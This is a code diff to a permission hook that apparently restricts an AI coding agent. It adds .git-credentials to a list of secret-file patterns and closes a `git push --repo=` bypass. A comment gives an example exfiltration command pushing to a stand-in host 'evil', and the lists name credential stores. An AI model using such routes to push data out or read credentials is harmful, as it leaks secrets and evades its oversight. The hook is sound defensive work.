@@ -82,6 +82,7 @@ const SECRET_PATH_PATTERNS = [
   /(^|\/)\.docker(\/|$)/,
   /(^|\/)\.config(\/|$)/, // ~/.config/gh/hosts.yml (gh cred store)
   /(^|\/)\.gitconfig$/,
+  /(^|\/)\.git-credentials$/, // git credential-store plaintext (defense-in-depth)
   /(^|\/)\.claude(\/|$)/, // the spawn settings + this hook's allowlist file
   /(^|\/)settings\.json$/,
   /(^|\/)hosts\.ya?ml$/,
@@ -224,8 +225,22 @@ function gitVerbReason(tokens) {
   if (sub === "remote") return "git remote (set-url/get-url leaks/redirects token)";
   if (sub === "ls-remote") return "git ls-remote (prints remote URL)";
   if (sub === "push") {
-    // a push target must be exactly `origin` (or omitted → default). A second
-    // bare token that is not a flag and not `origin` is an alternate remote.
+    // `--repo <url>` / `--repo=<url>` is documented as equivalent to the
+    // positional <repository> arg (git push --help). A `-`-prefixed token
+    // escapes the positional filter below, so check it explicitly — else
+    // `git push --repo=https://evil/x` is an egress channel past the
+    // origin-only enforcer (security-sentinel P1).
+    for (let i = 2; i < tokens.length; i++) {
+      const t = tokens[i];
+      if (t === "--repo") {
+        if ((tokens[i + 1] ?? "") !== "origin")
+          return "git push --repo to a non-origin remote";
+      } else if (t.startsWith("--repo=")) {
+        if (t.slice("--repo=".length) !== "origin")
+          return "git push --repo= to a non-origin remote";
+      }
+    }
+    // a positional push target must be exactly `origin` (or omitted → default).
     const rest = tokens.slice(2).filter((t) => !t.startsWith("-"));
     if (rest.length && rest[0] !== "origin")
       return `git push to non-origin remote '${rest[0]}'`;
